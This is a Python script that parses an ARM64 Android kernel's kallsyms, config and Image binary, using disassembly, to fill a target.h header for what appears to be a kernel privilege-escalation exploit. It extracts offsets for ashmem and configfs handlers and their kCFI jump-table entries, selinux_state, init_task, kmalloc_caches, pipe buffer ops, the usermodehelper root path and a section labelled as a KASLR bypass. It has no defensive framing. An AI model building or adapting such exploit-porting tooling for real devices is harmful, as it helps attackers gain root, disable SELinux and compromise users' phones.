#!/usr/bin/env python3
"""
generate_target.py — parse kallsyms.txt + config.txt + Image binary data and
patch target.h with auto-extracted offsets.  No vmlinux/DWARF required.

Usage: python3 generate_target.py <kallsyms.txt> <config.txt> <Image> --template <target.h> -o <output.h>
       If --template is given, patches only known defines; all other lines preserved verbatim.
"""

import sys
import re
import struct
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM


# ---------------------------------------------------------------------------
# kallsyms parser
# ---------------------------------------------------------------------------
def parse_kallsyms(path: str) -> dict[str, int]:
    """Parse a kallsyms.txt file into {symbol_name: address} dict."""
    symbols = {}
    with open(path) as f:
        for line in f:
            parts = line.strip().split(maxsplit=2)
            if len(parts) == 3:
                symbols[parts[2]] = int(parts[0], 16)
    return symbols


def lookup(symbols: dict[str, int], name: str) -> int:
    """Look up a symbol address, raise KeyError if not found."""
    if name not in symbols:
        raise KeyError(f"symbol '{name}' not found in kallsyms")
    return symbols[name]


def lookup_prefix(symbols: dict[str, int], prefix: str, *, exclude_jt: bool = False) -> int:
    """
    Look up a symbol by prefix match — handles kCFI and LLVM suffixes like
    'ashmem_ioctl$94e7f5232abcc7a2c44808354c7d925d' or
    'configfs_read_file.llvm.1166849574682616323'.
    If exclude_jt is True, skip '.cfi_jt' entries (return raw function addr).
    """
    matches = [(n, a) for n, a in symbols.items()
               if n.startswith(prefix)
               and not (exclude_jt and ".cfi_jt" in n)]
    if not matches:
        raise KeyError(f"symbol with prefix '{prefix}' not found in kallsyms")
    if len(matches) > 1:
        # If exact match among candidates, prefer it
        exact = [m for m in matches if m[0] == prefix]
        if len(exact) == 1:
            return exact[0][1]
        names = [m[0] for m in matches[:5]]
        # If multiple have the same prefix (e.g. .llvm.), pick first if unambiguous stem
        return matches[0][1]
    return matches[0][1]


def lookup_func(symbols: dict[str, int], name: str) -> int:
    """
    Try exact match first, then prefix match with '$', '.llvm.', and '.' for compiler-suffixed builds.
    """
    if name in symbols:
        return symbols[name]
    for sep in ("$", ".llvm.", "."):
        try:
            return lookup_prefix(symbols, name + sep, exclude_jt=True)
        except KeyError:
            continue
    raise KeyError(f"symbol '{name}' (or suffixed variant) not found in kallsyms")


def lookup_jt(symbols: dict[str, int], name: str) -> int:
    """
    Look up the CFI jump-table entry. Falls back to raw function on non-CFI or KCFI.
    """
    for sep in ("$", ".llvm.", "."):
        matches = [(n, a) for n, a in symbols.items()
                   if n.startswith(name + sep) and ".cfi_jt" in n]
        if matches:
            return matches[0][1]
    jt_name = name + ".cfi_jt"
    if jt_name in symbols:
        return symbols[jt_name]
    print(f"  (no .cfi_jt for '{name}' — using raw function address)")
    return lookup_func(symbols, name)


# ---------------------------------------------------------------------------
# kernel .config parser
# ---------------------------------------------------------------------------
def parse_config(path: str) -> dict[str, str]:
    """Parse a kernel .config file into {KEY: value} dict (strip CONFIG_ prefix)."""
    config = {}
    with open(path) as f:
        for line in f:
            m = re.match(r"^CONFIG_(\w+)=(.*)", line)
            if m:
                config[m.group(1)] = m.group(2).strip('"')
    return config


# ---------------------------------------------------------------------------
# Image binary reader
# ---------------------------------------------------------------------------
class ImageReader:
    def __init__(self, image_path: str, text_base: int, symbols: dict[str, int]):
        self.text_base = text_base
        self.symbols = symbols
        with open(image_path, "rb") as f:
            self._data = f.read()

    def _file_off(self, virt_addr: int) -> int:
        return virt_addr - self.text_base

    def _read_u32(self, file_off: int) -> int:
        return struct.unpack_from("<I", self._data, file_off)[0]

    def _read_u64(self, file_off: int) -> int:
        return struct.unpack_from("<Q", self._data, file_off)[0]

    def resolve_field_offset(self, parent_sym: str, field_sym: str) -> int:
        parent_addr = lookup(self.symbols, parent_sym)
        field_addr = lookup(self.symbols, field_sym)
        file_base = self._file_off(parent_addr)
        for off in range(0, 512, 8):
            if self._read_u64(file_base + off) == field_addr:
                return off
        raise ValueError(
            f"could not find '{field_sym}' pointer inside '{parent_sym}'"
        )

    def disasm_find_bl_return(self, caller_name: str, callee_names: list) -> int:
        """Disassemble caller_name, find first bl to any callee_names, return ret-addr offset."""
        caller_addr = lookup_func(self.symbols, caller_name)
        file_off = self._file_off(caller_addr)
        code = self._data[file_off : file_off + 0x800]
        md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        md.detail = True

        callee_addrs = {}
        for name in callee_names:
            try:
                callee_addrs[name] = lookup_func(self.symbols, name)
            except KeyError:
                pass

        for insn in md.disasm(code, caller_addr):
            if insn.mnemonic == "bl":
                target = insn.operands[0].imm
                if target < 0:
                    target = target & 0xFFFFFFFFFFFFFFFF
                for name, addr in callee_addrs.items():
                    if target == addr:
                        return insn.address + 4 - caller_addr
        raise ValueError(
            f"no bl to {callee_names} found in first 0x800 bytes of '{caller_name}'"
        )

    def resolve_trace_event_id(self, event_name: str) -> int:
        """
        Derive dynamic trace event ID statically using Capstone and _ftrace_events table:
        1. Disassemble register_trace_event to find dynamic ID base (typically 17 / 0x11).
        2. Walk the _ftrace_events array between __start_ftrace_events and __stop_ftrace_events.
        3. Index of event_call in _ftrace_events + base_id = runtime event_id.
        """
        base_id = 17
        try:
            reg_addr = lookup_func(self.symbols, "register_trace_event")
            file_off = self._file_off(reg_addr)
            code = self._data[file_off : file_off + 0x200]
            md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
            md.detail = True
            for insn in md.disasm(code, reg_addr):
                if insn.mnemonic == "mov" and len(insn.operands) == 2 and insn.operands[1].type == 2:
                    imm = insn.operands[1].imm
                    if 10 <= imm <= 32:
                        base_id = imm
                        break
        except Exception:
            pass

        event_call_addr = lookup(self.symbols, event_name)
        start_addr = lookup(self.symbols, "__start_ftrace_events")
        stop_addr = lookup(self.symbols, "__stop_ftrace_events")
        num_events = (stop_addr - start_addr) // 8
        file_base = self._file_off(start_addr)

        for i in range(num_events):
            ptr = self._read_u64(file_base + i * 8)
            if ptr == event_call_addr:
                return base_id + i

        raise ValueError(f"'{event_name}' not found in _ftrace_events array")


# ---------------------------------------------------------------------------
# Hex formatting
# ---------------------------------------------------------------------------
def h(val: int) -> str:
    """Format hex: 8 digits for <4GB offsets, 16 for full addresses."""
    return f"{val:08x}" if val < 0x100000000 else f"{val:016x}"


# ---------------------------------------------------------------------------
# Compute all extracted values
# ---------------------------------------------------------------------------
def compute_values(symbols: dict[str, int], config: dict[str, str], img: ImageReader) -> dict[str, str]:
    """Return {MACRO_NAME: replacement_line} for every define we extract."""
    text_base = lookup(symbols, "_text")

    va_bits = int(config.get("ARM64_VA_BITS", "39"))
    page_offset = (-1 << va_bits) & 0xFFFFFFFFFFFFFFFF
    direct_map_size = 1 << (va_bits - 3)
    direct_map_end = (page_offset + direct_map_size) & 0xFFFFFFFFFFFFFFFF
    ptr_size = 8 if config.get("64BIT") == "y" else 4

    def _off(addr: int) -> int:
        return addr - text_base

    def _line(name: str, val: int, comment: str, *, ullsuffix: bool = True) -> str:
        """Build a #define line matching original formatting."""
        suf = "ULL" if ullsuffix else ""
        return f"#define {name} 0x{h(val)}{suf}   /* {comment} */"

    # ---- ashmem ----
    fops_field_off = img.resolve_field_offset("ashmem_misc", "ashmem_fops")
    ashmem_misc_fops_off = _off(lookup(symbols, "ashmem_misc")) + fops_field_off
    print(f"  offsetof(miscdevice, fops) = 0x{h(fops_field_off)}  (resolved from Image)")

    # ---- TraceFS worker caller ----
    try:
        try:
            schedule_delta = img.disasm_find_bl_return("worker_thread", ["schedule"])
        except ValueError:
            schedule_delta = img.disasm_find_bl_return("worker_thread", ["__schedule"])
        worker_thread_off = _off(lookup_func(symbols, "worker_thread"))
        slide_tracefs_worker_caller_off = worker_thread_off + schedule_delta
        print(f"  worker_thread+0x{h(schedule_delta)} ({schedule_delta}) = return from bl schedule (capstone)")
    except ValueError as e:
        print(f"  WARNING: {e} — SLIDE_TRACEFS_WORKER_CALLER_OFF will not be patched")
        slide_tracefs_worker_caller_off = None
        schedule_delta = None

    # ---- TraceFS event ID ----
    try:
        event_id = img.resolve_trace_event_id("event_sched_blocked_reason")
        print(f"  event_sched_blocked_reason event_id = {event_id} (0x{event_id:02x}) (capstone + _ftrace_events)")
    except Exception as e:
        print(f"  WARNING: Could not extract SLIDE_TRACEFS_EVENT_ID: {e}")
        event_id = None

    # ---- random_table[4].data ----
    random_boot_id_off = img.resolve_field_offset("random_table", "sysctl_bootid")
    slide_random_boot_id_data_off = _off(lookup(symbols, "random_table")) + random_boot_id_off

    values = {
        # Kernel image layout
        "KIMAGE_TEXT_BASE":              h(text_base),
        "P0_PAGE_OFFSET":                h(page_offset),
        "KERNELSNITCH_IDENTITY_START":   h(page_offset),
        "KERNELSNITCH_IDENTITY_END":     h(direct_map_end),
        "DIRECT_MAP_BASE":               h(page_offset),
        "DIRECT_MAP_END":                h(direct_map_end),

        # ashmem
        "ASHMEM_MISC_FOPS_OFF":  h(ashmem_misc_fops_off),
        "ASHMEM_FOPS_OFF":       h(_off(lookup(symbols, "ashmem_fops"))),
        "ASHMEM_IOCTL_OFF":          h(_off(lookup_func(symbols, "ashmem_ioctl"))),
        "ASHMEM_COMPAT_IOCTL_OFF":   h(_off(lookup_func(symbols, "compat_ashmem_ioctl"))),
        "ASHMEM_MMAP_OFF":           h(_off(lookup_func(symbols, "ashmem_mmap"))),
        "ASHMEM_OPEN_OFF":           h(_off(lookup_func(symbols, "ashmem_open"))),
        "ASHMEM_RELEASE_OFF":        h(_off(lookup_func(symbols, "ashmem_release"))),
        "ASHMEM_SHOW_FDINFO_OFF":    h(_off(lookup_func(symbols, "ashmem_show_fdinfo"))),

        # configfs
        "CONFIGFS_READ_ITER_OFF":       h(_off(lookup_func(symbols, "configfs_read_file"))),
        "CONFIGFS_BIN_WRITE_ITER_OFF":  h(_off(lookup_func(symbols, "configfs_write_bin_file"))),

        # misc exported
        "COPY_SPLICE_READ_OFF":  h(_off(lookup(symbols, "generic_file_splice_read"))),
        "NOOP_LLSEEK_OFF":       h(_off(lookup(symbols, "noop_llseek"))),

        # kernel data objects
        "INIT_TASK_OFF":           h(_off(lookup(symbols, "init_task"))),
        "ROOT_TASK_GROUP_OFF":     h(_off(lookup(symbols, "root_task_group"))),
        "SELINUX_ENFORCING_OFF":   h(_off(lookup(symbols, "selinux_state"))),
        "KMALLOC_CACHES_OFF":      h(_off(lookup(symbols, "kmalloc_caches"))),
        "ANON_PIPE_BUF_OPS_OFF":   h(_off(lookup(symbols, "anon_pipe_buf_ops"))),

        # root usermodehelper
        "CALL_USERMODEHELPER_EXEC_WORK_OFF": h(_off(lookup_func(symbols, "call_usermodehelper_exec_work"))),
        "SYSTEM_UNBOUND_WQ_OFF":             h(_off(lookup(symbols, "system_unbound_wq"))),

        # SLIDE KASLR bypass
        "SLIDE_NFULNL_LOGGER_OFF":        h(_off(lookup(symbols, "nfulnl_logger"))),
        "SLIDE_LOGGERS_0_1_OFF":          h(_off(lookup(symbols, "loggers")) + ptr_size),
        "SLIDE_RANDOM_BOOT_ID_DATA_OFF":  h(slide_random_boot_id_data_off),
        "SLIDE_SYSCTL_BOOTID_OFF":        h(_off(lookup(symbols, "sysctl_bootid"))),
        "SLIDE_INIT_TASK_OFF":           "#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF",
        "SLIDE_ROOT_TASK_GROUP_OFF":     "#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF",
        "SLIDE_TRACEFS_WORKER_CALLER_OFF": (h(slide_tracefs_worker_caller_off), schedule_delta) if slide_tracefs_worker_caller_off is not None else None,
        "SLIDE_TRACEFS_EVENT_ID":         str(event_id) if event_id is not None else None,

        # kCFI canonical (.cfi_jt)
        "ASHMEM_IOCTL_JT_OFF":           h(_off(lookup_jt(symbols, "ashmem_ioctl"))),
        "ASHMEM_COMPAT_IOCTL_JT_OFF":    h(_off(lookup_jt(symbols, "compat_ashmem_ioctl"))),
        "ASHMEM_MMAP_JT_OFF":            h(_off(lookup_jt(symbols, "ashmem_mmap"))),
        "ASHMEM_OPEN_JT_OFF":            h(_off(lookup_jt(symbols, "ashmem_open"))),
        "ASHMEM_RELEASE_JT_OFF":         h(_off(lookup_jt(symbols, "ashmem_release"))),
        "ASHMEM_SHOW_FDINFO_JT_OFF":     h(_off(lookup_jt(symbols, "ashmem_show_fdinfo"))),
        "ASHMEM_LLSEEK_JT_OFF":          h(_off(lookup_jt(symbols, "ashmem_llseek"))),
        "CONFIGFS_READ_FILE_JT_OFF":      h(_off(lookup_jt(symbols, "configfs_read_file"))),
        "CONFIGFS_WRITE_BIN_FILE_JT_OFF": h(_off(lookup_jt(symbols, "configfs_write_bin_file"))),
        "NOOP_LLSEEK_JT_OFF":            h(_off(lookup_jt(symbols, "noop_llseek"))),
        "CALL_USERMODEHELPER_EXEC_WORK_JT_OFF": h(_off(lookup_jt(symbols, "call_usermodehelper_exec_work"))),
    }

    return values


# ---------------------------------------------------------------------------
# Patch template
# ---------------------------------------------------------------------------
def patch_template(template_path: str, values: dict[str, str], output_path: str):
    """Read template, replace hex values in known #define lines, write output.
    Preserves original whitespace, comments, and formatting exactly."""
    def_re = re.compile(r"^(#define\s+(\w+)\s+)0x[0-9a-fA-F]+")
    def_dec_re = re.compile(r"^(#define\s+(\w+)\s+)\d+")
    with open(template_path) as f:
        lines = f.readlines()

    patched = []
    for line in lines:
        m = def_re.match(line)
        m_dec = def_dec_re.match(line) if not m else None
        match_obj = m or m_dec
        if match_obj and match_obj.group(2) in values and values[match_obj.group(2)] is not None:
            val = values[match_obj.group(2)]
            if isinstance(val, tuple):
                new_hex, delta = val
                tail = re.sub(r"worker_thread\+\d+", f"worker_thread+{delta}", line[match_obj.end():])
                new_line = f"{match_obj.group(1)}0x{new_hex}{tail}"
            elif m_dec:
                new_line = f"{match_obj.group(1)}{val}{line[match_obj.end():]}"
            else:
                new_line = f"{match_obj.group(1)}0x{val}{line[match_obj.end():]}"
            if new_line != line:
                print(f"  PATCH {match_obj.group(2)}")
            patched.append(new_line)
        else:
            patched.append(line)
    with open(output_path, "w") as f:
        f.writelines(patched)

    print(f"Patched {output_path}")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    args = sys.argv[1:]
    template_path = None
    output_path = "target.h"

    # Parse args
    positional = []
    i = 0
    while i < len(args):
        if args[i] == "--template" and i + 1 < len(args):
            template_path = args[i + 1]
            i += 2
        elif args[i] == "-o" and i + 1 < len(args):
            output_path = args[i + 1]
            i += 2
        else:
            positional.append(args[i])
            i += 1

    if len(positional) < 3:
        print(
            "Usage: generate_target.py <kallsyms.txt> <config.txt> <Image> "
            "[--template target.h] [-o output.h]",
            file=sys.stderr,
        )
        sys.exit(1)

    kallsyms_path, config_path, image_path = positional[0], positional[1], positional[2]

    symbols = parse_kallsyms(kallsyms_path)
    print(f"Parsed {len(symbols)} symbols from {kallsyms_path}")

    config = parse_config(config_path)
    print(f"Parsed {len(config)} configs from {config_path}")

    text_base = lookup(symbols, "_text")
    img = ImageReader(image_path, text_base, symbols)
    print(f"Image text_base=0x{h(text_base)}")

    values = compute_values(symbols, config, img)

    if template_path:
        patch_template(template_path, values, output_path)
    else:
        # No template — just write values (for debugging)
        with open(output_path, "w") as f:
            for name, line in sorted(values.items()):
                f.write(line + "\n")
        print(f"Wrote {len(values)} defines to {output_path}")

    # ---- Strict Validation Check ----
    missing = [k for k, v in values.items() if v is None]
    if missing:
        print(f"FAILED: Missing or unresolved defines: {missing}", file=sys.stderr)
        sys.exit(1)
    else:
        print("SUCCESS: All required defines extracted and patched.")


if __name__ == "__main__":
    main()
